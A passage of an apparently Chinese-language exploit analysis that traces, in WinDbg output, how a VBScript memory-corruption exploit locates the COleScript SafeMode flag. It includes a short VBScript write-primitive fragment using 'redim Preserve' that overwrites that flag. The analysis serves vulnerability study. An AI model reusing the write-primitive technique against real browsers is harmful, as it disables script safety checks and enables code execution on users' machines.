<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">01</span><span class="n">df84e0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000060</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000010</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb02e64</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb1c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb02e64</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">esp</span> <span class="n">L4</span>
<span class="mi">0249</span><span class="n">cb1c</span>  <span class="mi">6</span><span class="n">fb13991</span> <span class="mi">0013</span><span class="n">ebf0</span> <span class="mi">02</span><span class="n">e678f8</span> <span class="mi">01</span><span class="n">df84e0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">01</span><span class="n">df84e0</span> <span class="n">L4</span>
<span class="mi">01</span><span class="n">df84e0</span>  <span class="mi">00000003</span> <span class="mi">00000000</span> <span class="mi">01</span><span class="n">df8724</span> <span class="mi">41</span><span class="n">a00001</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">ln</span> <span class="n">poi</span><span class="o">(</span><span class="mi">01</span><span class="n">df8724</span><span class="o">)</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">ln</span> <span class="n">poi</span><span class="o">(</span><span class="mi">01</span><span class="n">df8724</span><span class="o">-</span><span class="mi">8</span><span class="o">)</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">ln</span> <span class="n">poi</span><span class="o">(</span><span class="mi">01</span><span class="n">df8724</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="mi">4</span><span class="o">)</span>
<span class="o">(</span><span class="mi">6</span><span class="n">fb04934</span><span class="o">)</span>   <span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptEntryPoint</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="s1">&#39;   |  (6fb1ab54)   vbscript!CEntryPointDispatch::`vftable&#39;</span>
<span class="n">Exact</span> <span class="n">matches</span><span class="o">:</span>
    <span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptEntryPoint</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">&#39;</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">no</span> <span class="n">type</span> <span class="n">information</span><span class="o">&gt;</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc10</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0013</span><span class="n">f274</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00910</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000001</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb11f4c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb18</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb11f4c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">02</span><span class="n">e678e8</span> <span class="n">L20</span>
<span class="mi">02</span><span class="n">e678e8</span>  <span class="n">ef</span> <span class="mi">6</span><span class="n">a</span> <span class="n">d2</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">02</span> <span class="mi">08</span><span class="o">-</span><span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">.</span><span class="na">j</span><span class="o">.</span><span class="na">hlK</span><span class="o">..........</span>
<span class="mi">02</span><span class="n">e678f8</span>  <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">24</span> <span class="mi">87</span> <span class="n">df</span> <span class="mi">01</span> <span class="mi">01</span> <span class="mi">00</span> <span class="n">a0</span> <span class="mi">41</span>  <span class="o">........</span><span class="n">$</span><span class="o">......</span><span class="n">A</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">01</span><span class="n">df84e0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000002</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00910</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000010</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb02e64</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb1c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000202</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb02e64</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb2c</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb11f4c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb00</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb11f4c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">02</span><span class="n">e678e8</span> <span class="n">L20</span>
<span class="mi">02</span><span class="n">e678e8</span>  <span class="n">ef</span> <span class="mi">6</span><span class="n">a</span> <span class="n">d2</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">02</span> <span class="mi">08</span><span class="o">-</span><span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">.</span><span class="na">j</span><span class="o">.</span><span class="na">hlK</span><span class="o">..........</span>
<span class="mi">02</span><span class="n">e678f8</span>  <span class="mi">08</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">08</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">24</span> <span class="mi">87</span> <span class="n">df</span> <span class="mi">01</span> <span class="mi">01</span> <span class="mi">00</span> <span class="n">a0</span> <span class="mi">41</span>  <span class="o">........</span><span class="n">$</span><span class="o">......</span><span class="n">A</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">01</span><span class="n">df84f0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc70</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0249</span><span class="n">cbf8</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">df84f0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb02e64</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb1c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cc18</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb02e64</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">esp</span> <span class="n">L4</span>
<span class="mi">0249</span><span class="n">cb1c</span>  <span class="mi">6</span><span class="n">fb0cb42</span> <span class="mi">0013</span><span class="n">ebf0</span> <span class="mi">01</span><span class="n">df84f0</span> <span class="mi">01</span><span class="n">df84e0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">01</span><span class="n">df84e0</span> <span class="n">L4</span>
<span class="mi">01</span><span class="n">df84e0</span>  <span class="mi">00000003</span> <span class="mi">00000000</span> <span class="mi">01</span><span class="n">df8648</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">01</span><span class="n">df8724</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="mi">4</span> <span class="n">L8</span>
<span class="mi">01</span><span class="n">df8718</span>  <span class="mi">6</span><span class="n">fb04934</span> <span class="mi">00000001</span> <span class="mi">01</span><span class="n">df8648</span> <span class="mi">01</span><span class="n">e007f8</span>
<span class="mi">01</span><span class="n">df8728</span>  <span class="mi">01</span><span class="n">e028bc</span> <span class="mi">00000000</span> <span class="mi">01</span><span class="n">df8648</span> <span class="mi">0013</span><span class="n">ebf0</span>
</pre></div>


<h4>3 修改SafeMode</h4>
<p>最后我们再来看下exploit如何借助Write primitive对SafeMode标志进行修改。由前面的分析可知此标志是vbscript!COleScript对象指针特定偏移处的一个值，而vbscript!COleScript对象指针又可以通过vbscript!CScriptEntryPoint对象指针得到，因此SafeMode标志的查找过程如下：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">ln</span> <span class="n">poi</span><span class="o">(</span><span class="mi">01</span><span class="n">df8718</span><span class="o">)</span>
<span class="o">(</span><span class="mi">6</span><span class="n">fb04934</span><span class="o">)</span>   <span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptEntryPoint</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="s1">&#39;   |  (6fb1ab54)   vbscript!CEntryPointDispatch::`vftable&#39;</span>
<span class="n">Exact</span> <span class="n">matches</span><span class="o">:</span>
    <span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptEntryPoint</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="s1">&#39; = &lt;no type information&gt;</span>
<span class="s1">0:005&gt; dd 01df8718+8 L1</span>
<span class="s1">01df8720  01df8648</span>
<span class="s1">0:005&gt; dd 01df8648+10 L1</span>
<span class="s1">01df8658  01df75f0</span>
<span class="s1">0:005&gt; ln poi(01df75f0)</span>
<span class="s1">(6fb04868)   vbscript!COleScript::`vftable&#39;</span>   <span class="o">|</span>  <span class="o">(</span><span class="mi">6</span><span class="n">fb1fdbc</span><span class="o">)</span>   <span class="n">vbscript</span><span class="o">!</span><span class="err">`</span><span class="n">string</span><span class="s1">&#39;</span>
<span class="s1">Exact matches:</span>
<span class="s1">    vbscript!COleScript::`vftable&#39;</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">no</span> <span class="n">type</span> <span class="n">information</span><span class="o">&gt;</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">01</span><span class="n">df75f0</span><span class="o">+</span><span class="mi">174</span> <span class="n">L4</span>
<span class="mi">01</span><span class="n">df7764</span>  <span class="mi">0000000</span><span class="n">e</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</pre></div>


<p>当找到此标志所在内存地址后，接下去就是对其进行修改，相关代码如下：</p>
<div class="codehilite"><pre><span></span>if (j=14) then
  redim Preserve aa(a2)
  aa(a1+2)(i+&amp;h11c+k)=ab(4)  &#39;write primitive&#39;
  redim Preserve aa(a0)
  exit for
end if
</pre></div>


<p>我们来跟下这个过程：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">bl</span>
 <span class="mi">0</span> <span class="n">e</span> <span class="mi">7664</span><span class="n">ec2c</span>     <span class="mi">0001</span> <span class="o">(</span><span class="mi">0001</span><span class="o">)</span>  <span class="mi">0</span><span class="o">:****</span> <span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span> <span class="s2">&quot;.if(poi(poi(02e67900)-4)=0x0e){}.else{gc}&quot;</span>
 <span class="mi">1</span> <span class="n">d</span> <span class="mi">6</span><span class="n">fb02e64</span>     <span class="mi">0001</span> <span class="o">(</span><span class="mi">0001</span><span class="o">)</span>  <span class="mi">0</span><span class="o">:****</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span>
 <span class="mi">2</span> <span class="n">d</span> <span class="mi">6</span><span class="n">fb11f4c</span>     <span class="mi">0001</span> <span class="o">(</span><span class="mi">0001</span><span class="o">)</span>  <span class="mi">0</span><span class="o">:****</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb14</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">004692</span><span class="n">e8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000060</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">df84e0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">7664</span><span class="n">ec2c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb00</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb1c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span><span class="o">:</span>
<span class="mi">7664</span><span class="n">ec2c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">02</span><span class="n">e678e8</span> <span class="n">L20</span>
<span class="mi">02</span><span class="n">e678e8</span>  <span class="n">ef</span> <span class="mi">6</span><span class="n">a</span> <span class="n">d2</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">02</span> <span class="mi">08</span><span class="o">-</span><span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">.</span><span class="na">j</span><span class="o">.</span><span class="na">hlK</span><span class="o">..........</span>
<span class="mi">02</span><span class="n">e678f8</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">68</span> <span class="mi">77</span> <span class="n">df</span> <span class="mi">01</span> <span class="mi">01</span> <span class="mi">00</span> <span class="n">a0</span> <span class="mi">41</span>  <span class="o">........</span><span class="n">hw</span><span class="o">.....</span><span class="n">A</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span>
<span class="n">breakpoint</span> <span class="mi">0</span> <span class="n">redefined</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd58</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">004692</span><span class="n">e8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000078</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">df8510</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">7664</span><span class="n">ec2c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd44</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd60</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span><span class="o">:</span>
<span class="mi">7664</span><span class="n">ec2c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">be</span> <span class="o">*</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd70</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ceb4</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ceb4</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00910</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb11f4c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd44</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd5c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb11f4c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">esp</span> <span class="n">L8</span>
<span class="mi">0249</span><span class="n">cd44</span>  <span class="mi">6</span><span class="n">fb12028</span> <span class="mi">0249</span><span class="n">ce54</span> <span class="mi">0013</span><span class="n">f274</span> <span class="mi">00000001</span>
<span class="mi">0249</span><span class="n">cd54</span>  <span class="mi">01</span><span class="n">df8510</span> <span class="mi">0249</span><span class="n">cd70</span> <span class="mi">0249</span><span class="n">ce5c</span> <span class="mi">6</span><span class="n">fb0dc01</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">gu</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ceb4</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ce54</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000002</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00910</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb12028</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd5c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd5c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptRuntime</span><span class="o">::</span><span class="n">LockArray</span><span class="o">+</span><span class="mh">0x1a</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb12028</span> <span class="mi">85</span><span class="n">c0</span>            <span class="n">test</span>    <span class="n">eax</span><span class="o">,</span><span class="n">eax</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">poi</span><span class="o">(</span><span class="mi">0249</span><span class="n">ce54</span><span class="o">)</span> <span class="n">L4</span>
<span class="mi">02</span><span class="n">e67930</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">ole32</span><span class="o">!</span><span class="n">tagSAFEARRAY</span> <span class="n">poi</span><span class="o">(</span><span class="mi">0249</span><span class="n">cd70</span><span class="o">)</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="n">cDims</span>            <span class="o">:</span> <span class="mi">1</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="n">fFeatures</span>        <span class="o">:</span> <span class="mh">0x880</span>
